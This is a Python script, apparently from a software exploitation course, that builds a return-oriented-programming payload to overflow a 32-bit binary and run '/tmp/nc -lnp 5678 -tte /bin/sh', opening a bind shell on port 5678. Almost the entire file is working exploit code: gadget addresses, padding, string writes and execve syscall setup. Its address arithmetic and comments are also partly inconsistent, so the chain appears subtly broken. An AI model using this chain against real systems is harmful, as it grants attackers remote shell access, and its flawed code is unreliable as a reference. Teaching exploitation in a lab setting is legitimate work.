"""
This is incomplete code and you are supposed to complete it.
We want to execute "/tmp/nc -lnp 5678 -tte /bin/sh" via execve syscall.

----------------------------------------
execve calling convention:

1. EAX = 11
2. EBX = "/tmp//nc" (char *)
3. ECX = arguments (char **) -> char *arguments[7]= { "/tmp//nc", "-lnp", "5678", "-tte", "/bin//sh", NULL}
4. EDX = env (char **) -> NULL
-----------------------------------------

The gadgets in the following code are based on my machine & binary and as a result you will have to adjust the gadget based on your environment.
With the latest ROPGadget tool that we used in the class, we get the following ropchain:
- Step 1 -- Write-what-where gadgets

	[+] Gadget found: 0x8056d05 mov dword ptr [edx], eax ; ret -> MOVISTACK
	[+] Gadget found: 0x806ee8b pop edx ; ret -> POPEDX
	[+] Gadget found: 0x80a8bf6 pop eax ; ret -> POPEAX
	[+] Gadget found: 0x80562c0 xor eax, eax ; ret -> XOREAX

- Step 2 -- Init syscall number gadgets

	[+] Gadget found: 0x80562c0 xor eax, eax ; ret
	[+] Gadget found: 0x807c32a inc eax ; ret -> INCEAX

- Step 3 -- Init syscall arguments gadgets

	[+] Gadget found: 0x80481c9 pop ebx ; ret -> POPEBX
	[+] Gadget found: 0x806eeb2 pop ecx ; pop ebx ; ret -> POPECX remember there is an extra POP, so you need to provide something meaningful for ebx too!
	[+] Gadget found: 0x806ee8b pop edx ; ret

- Step 4 -- Syscall gadget

	[+] Gadget found: 0x8049603 int 0x80

- Step 5 -- Build the ROP chain

"""


from struct import pack
import os
######################################
fileName="rop_data"
outfile=open(fileName, "wb")

GOTOSTACK	  	= pack('<I', 0x080da060) # @ .data
PLCEINTOSTACK 	= pack('<I', 0x08056d05) # mov dword ptr [edx], eax ; ret
INCEAX     		= pack('<I', 0x0807c32a) # inc %eax | ret
POPEDX			= pack('<I', 0x0806ee8b) # pop edx
POPEAX			= pack('<I', 0x080a8bf6) # pop eax
ZEROEAX 		= pack('<I', 0x080562c0) # # xor eax, eax ; ret , set eax to 0
ADDNULL 		= pack('<I', 0x080562c0) + pack('<I', 0x08056d05)
				# xor eax, eax ; ret  	# mov dword ptr [edx], eax ; ret
DUMMY 			= pack('<I', 0x42424242)

# Padding goes here
p = '\x41'*44

p += pack("<I", 0x806eeb2) 	# pop ecx ; pop ebx
p += pack("<I", 0x080da060) 	# ecx = stack address
p += DUMMY # ebx = DUMMY

p += pack("<I", 0x806ee8b) 	# pop edx
p += GOTOSTACK # @ .data edx=0x080da060

p += POPEAX # pop eax ; ret
p += '/tmp' 				# eax=/tmp
p += PLCEINTOSTACK # mov dword ptr [edx], eax ; ret ->[080da060]=/bin

p += POPEDX # pop edx ; ret
p += pack('<I', 0x080da060 + 4) # @ .data + 4 edx=0x080da064
p += POPEAX # pop eax ; ret
p += '//nc'					# eax=//nc
p += PLCEINTOSTACK # mov dword ptr [edx], eax ; ret ->[0x080da064]=//sh

# Add a \0 as a space
p += POPEDX
p += pack('<I', 0x080da060 + 8)
p += ADDNULL

# repeat the avobe process to copy rest of the commandline by adjusting the addresses
#### bear in mind that the computed addresses muct not have any \x00!!!!!!!


p += POPEDX # pop edx ; ret
p += pack('<I', 0x080da060 + 9) # @ .data + 9, one after /temp//nc
p += POPEAX
p += "-lnp"
p += PLCEINTOSTACK # mov dword ptr [edx], eax ; ret ->[0x080da064]=//sh


# Add a \0 as a space
p += POPEDX
p += pack('<I', 0x080da060 + 13)
p += ADDNULL

p += POPEDX # pop edx ; ret
p += pack('<I', 0x080da060 + 14) # @ .data + 14, one after /tmp//nc -lnp
p += POPEAX
p += "-tte"
p += PLCEINTOSTACK # mov dword ptr [edx], eax ; ret

# Add a \0 as a space
p += POPEDX
p += pack('<I', 0x080da060 + 18)
p += ADDNULL

p += POPEDX # pop edx ; ret
p += pack('<I', 0x080da060 + 19) # @ .data + 19, one after /temp//nc -lnp -tte
p += POPEAX
p += "/bin"
p += PLCEINTOSTACK # mov dword ptr [edx], eax ; ret ->[0x080da064]=//sh

p += POPEDX # pop edx ; ret
p += pack('<I', 0x080da060 + 23) # @ .data + 19, after /temp//nc -lnp -tte /bin
p += POPEAX
p += "//sh"
p += PLCEINTOSTACK # mov dword ptr [edx], eax ; ret ->[0x080da064]=//sh

# Add a \0 as a space
p += POPEDX
p += pack('<I', 0x080da060 + 27)
p += ADDNULL

# once done, start seting up arguments[] see example python code exploit-nc.py at line 130
# We currently have our list of elements separated by \0
# Now we must construct our char ** i.e. array 'argguments' of strings
# arguments=[ @"/bin//nc", @"-lnp", @"6666", @"-tte", @"/bin//sh"]

# choose an address after @.data + len(commandline +1). Lets call it X. later on, this will be the content of ecx.

p += POPEDX # pop edx ; ret
p += pack('<I', 0x080da060 + 60) # @ .data + 60, far after command, to use as shadow stack
p += POPEAX
p += pack("<I", 0x080ef240)
p += PLCEINTOSTACK # mov dword ptr [edx], eax ; ret ->[0x080da064]=//sh

p += POPEDX # pop edx ; ret
p += pack('<I', 0x080da060 + 64) # @ .data + 60, + 4 for second arg
p += POPEAX
p += pack("<I", 0x080ef240 + 9)
p += PLCEINTOSTACK # mov dword ptr [edx], eax ; ret ->[0x080da064]=//sh

p += POPEDX # pop edx ; ret
p += pack('<I', 0x080da060 + 68) # @ .data + 60,  +8 for second arg
p += POPEAX
p += pack("<I", 0x080ef240 + 14)
p += PLCEINTOSTACK # mov dword ptr [edx], eax ; ret ->[0x080da064]=//sh

p += POPEDX # pop edx ; ret
p += pack('<I', 0x080da060 + 72) # @ .data + 60, +12 for second arg
p += POPEAX
p += pack("<I", 0x080ef240 + 19)
p += PLCEINTOSTACK # mov dword ptr [edx], eax ; ret ->[0x080da064]=//sh


#once done, we start setting up the environment for execve.
# now set ecx to have address of arguments[]
p += pack("<I", 0x806eeb2) 	# pop ecx ; pop ebx
p += pack("<I", 0x080da060 + 60) 	# ecx char **arguments
p += GOTOSTACK # @ .data -> ebx is set to program to execute [point 2]

p += pack("<I", 0x806ee8b) 	# pop edx
p += pack("<I", 0x080da060 + 31) 	# edx char *env

p += ZEROEAX				# %eax is put to zero.
p += INCEAX			# %eax is now 1
p += INCEAX			# %eax is now 2
p += INCEAX			# %eax is now 3
p += INCEAX			# %eax is now 4
p += INCEAX			# %eax is now 5
p += INCEAX			# %eax is now 6
p += INCEAX			# %eax is now 7
p += INCEAX			# %eax is now 8
p += INCEAX			# %eax is now 9
p += INCEAX			# %eax is now 10
p += INCEAX			# %eax is now 11

p += pack('<I', 0x08049603) # int 0x80				# we execute

outfile.write(p)
outfile.close()
